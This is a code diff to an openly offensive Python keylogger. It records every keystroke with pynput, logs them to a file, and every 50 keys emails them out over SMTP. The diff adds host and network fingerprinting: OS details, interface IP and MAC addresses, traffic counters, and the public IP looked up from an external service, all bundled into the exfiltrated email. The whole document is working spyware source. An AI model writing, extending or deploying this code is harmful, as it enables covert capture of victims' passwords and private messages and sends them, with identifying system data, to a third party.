@@ -3,16 +3,59 @@ import sys
 import logging
 import smtplib
 import ssl
+import psutil
+import platform
+from datetime import datetime
+from requests import get
 from pynput.keyboard import Key, Listener
 subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
 
-# Initialise variables
+## Initialise variables
 keys = []
 count = 0
 
-# Logging file
+## Logging file
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
+## Retrieving System Information + Network Information
+# Making bytes sorted
+def get_size(bytes, suffix="B"):
+    """
+    Scale bytes to its proper format
+    e.g:
+        1253656 => '1.20MB'
+        1253656678 => '1.17GB'
+    """
+    factor = 1024
+    for unit in ["", "K", "M", "G", "T", "P"]:
+        if bytes < factor:
+            return f"{bytes:.2f}{unit}{suffix}"
+        bytes /= factor
+
+# Print system information
+uname = platform.uname()
+sysInfo = f"======================================== System Information ======================================== \nSystem: {uname.system} \nNode Name: {uname.node} \nRelease: {uname.release} \nVersion: {uname.version} \nMachine: {uname.machine} \nProcessor: {uname.processor}\n"
+
+# Network information
+netInfo = f"======================================== Network Information ========================================\n"
+# Get all network interfaces (virtual and physical)
+if_addrs = psutil.net_if_addrs()
+for interface_name, interface_addresses in if_addrs.items():
+    for address in interface_addresses:
+        if str(address.family) == 'AddressFamily.AF_INET':
+            netInfo += f"=== Interface (INET): {interface_name} ===\nIP Address: {address.address}\nNetmask: {address.netmask}\nBroadcast IP: {address.broadcast}\n"
+        elif str(address.family) == 'AddressFamily.AF_INET6':
+            netInfo += f"=== Interface (INET6): {interface_name} ===\nMAC Address: {address.address}\nNetmask: {address.netmask}\nBroadcast MAC: {address.broadcast}\n"           
+# Get IO statistics since boot
+net_io = psutil.net_io_counters()
+netInfo += f"\nTotal Bytes Sent: {get_size(net_io.bytes_sent)}\n"
+netInfo += f"Total Bytes Received: {get_size(net_io.bytes_recv)}\n"
+
+# Get Public IP address
+ip = get('https://api.ipify.org').text
+pubIP = f"User's public IP address is: {ip}\n"
+
+## Keylogging 
 # Keystrokes detected
 def on_press(key):
     global keys, count
@@ -20,7 +63,7 @@ def on_press(key):
     print(key, "typed")
     # Adding key pressed to keys array
     keys.append(str(key))
-    count+=1
+    count += 1
     # Key limit, change after testing over
     if count > 50:
         # Reset key count
@@ -29,12 +72,13 @@ def on_press(key):
         # Clear keys array after sending email
         keys = []
 
-# Send logging content to Email 
-def email(keys):  
+# Send logging content to Email
+def email(keys):
     message = ""
+    message += f"{sysInfo}{netInfo}{pubIP}"
     for key in keys:
-        # Replace miscellenous characters to make it more readable 
-        x = key.replace("'","")
+        # Replace miscellenous characters to make it more readable
+        x = key.replace("'", "")
         if key == "Key.space":
             x = "SPACE"
         elif key == "Key.backspace":
@@ -46,6 +90,8 @@ def email(keys):
     sendEmail(message)
 
 # Email information
+
+
 def sendEmail(message):
     # For SSL
     port = 465
@@ -60,6 +106,7 @@ def sendEmail(message):
         server.login(senderEmail, password)
         server.sendmail(senderEmail, receiverEmail, message)
 
+
 # Record keystrokes
-with Listener(on_press=on_press) as listener :
+with Listener(on_press=on_press) as listener:
     listener.join()
